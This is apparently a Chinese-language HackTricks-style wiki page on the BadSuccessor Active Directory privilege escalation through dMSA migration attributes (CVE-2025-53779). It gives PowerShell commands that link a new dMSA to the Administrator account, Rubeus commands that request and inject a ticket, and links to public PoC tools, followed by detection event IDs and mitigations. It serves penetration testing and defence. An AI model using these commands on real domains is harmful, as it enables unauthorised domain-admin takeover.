# BadSuccessor：通过滥用 Delegated MSA 迁移进行权限提升

{{#include ../../banners/hacktricks-training.md}}

## 概述

Delegated Managed Service Accounts（**dMSA**）是随 Windows Server 2025 发布的下一代 **gMSA** successor。合法的迁移工作流允许管理员使用 dMSA 替换一个*旧*账户（用户、计算机或服务账户），同时透明地保留其权限。该工作流通过 `Start-ADServiceAccountMigration` 和 `Complete-ADServiceAccountMigration` 等 PowerShell cmdlets 提供，并依赖 **dMSA 对象**的两个 LDAP 属性：

* **`msDS-ManagedAccountPrecededByLink`** – 指向被替代（旧）账户的 *DN link*。
* **`msDS-DelegatedMSAState`**       – 迁移状态（`0` = 无，`1` = 进行中，`2` = *已完成*）。<sup>[[1]](#references)</sup>

如果攻击者能够在某个 OU 中创建**任意** dMSA，并直接操纵这两个属性，LSASS 和 KDC 就会将该 dMSA 视为所链接账户的 *successor*。当攻击者随后以该 dMSA 身份进行身份验证时，**他们将继承所链接账户的全部权限**——如果链接的是 Administrator 账户，权限最高可达 **Domain Admin**。<sup>[[1]](#references)</sup>

Unit 42 于 2025 年将该技术命名为 **BadSuccessor**。Microsoft 随后为其分配了 **CVE-2025-53779**，并于 **2025 年 8 月**发布了安全更新。该技术对于未打补丁的 Windows Server 2025 环境，以及对危险 OU delegation 的审查仍然具有相关性。<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### 攻击前提

1. 一个被*允许*在**组织单位（OU）**内创建对象的账户，并且至少具备以下权限之一：
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** 对象类
* `Create Child` → **`All Objects`**（generic create）
2. 能够连接 LDAP 和 Kerberos（标准域加入场景 / 远程攻击）。<sup>[[1]](#references)</sup>

## 枚举存在漏洞的 OU

Unit 42 发布了一个 PowerShell helper script，用于解析每个 OU 的 security descriptors，并突出显示所需的 ACE：<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
在底层，该脚本会对 `(objectClass=organizationalUnit)` 执行分页 LDAP 搜索，并检查每个 `nTSecurityDescriptor` 是否包含

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8`（对象类 *msDS-DelegatedManagedServiceAccount*）

## Exploitation Steps

识别出可写入的 OU 后，攻击只需进行 3 次 LDAP 写入：<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
复制完成后，攻击者可以直接以 `attacker_dMSA$` 身份 **logon**，或请求 Kerberos TGT —— Windows 将构建被 *superseded* 账户的令牌。<sup>[[1]](#references)</sup>

### Automation

多个公开 PoC 封装了包括密码检索和 ticket 管理在内的完整工作流：

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## 检测与 Hunting

在 OU 上启用 **Object Auditing**，并监控以下 Windows Security Events：<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – **dMSA** 对象的创建
* **5136** – **`msDS-ManagedAccountPrecededByLink`** 的修改
* **4662** – 特定属性的更改
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA 的 TGT 签发

关联 `4662`（属性修改）、`4741`（创建 computer/service account）和 `4624`（后续登录）可以快速识别 BadSuccessor 活动。XDR solutions（例如 **XSIAM**）提供了可直接使用的查询（参见 references）。<sup>[[2]](#references)</sup>

## 缓解措施

* 应用 Microsoft 针对 **CVE-2025-53779** 的 security update，并验证每个 Windows Server 2025 domain controller 的 patch level。<sup>[[6]](#references)</sup>
* 遵循 **least privilege** 原则——仅将 *Service Account* 管理权限委派给受信任的角色。
* 从不明确需要这些权限的 OU 中移除 `Create Child` / `msDS-DelegatedManagedServiceAccount`。
* 监控上述 event IDs，并针对创建或编辑 dMSA 的 *non-Tier-0* identities 触发告警。

## 另请参阅


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor：滥用 dMSA 在 Active Directory 中提升权限 – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – 当良好账户变坏：利用 Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
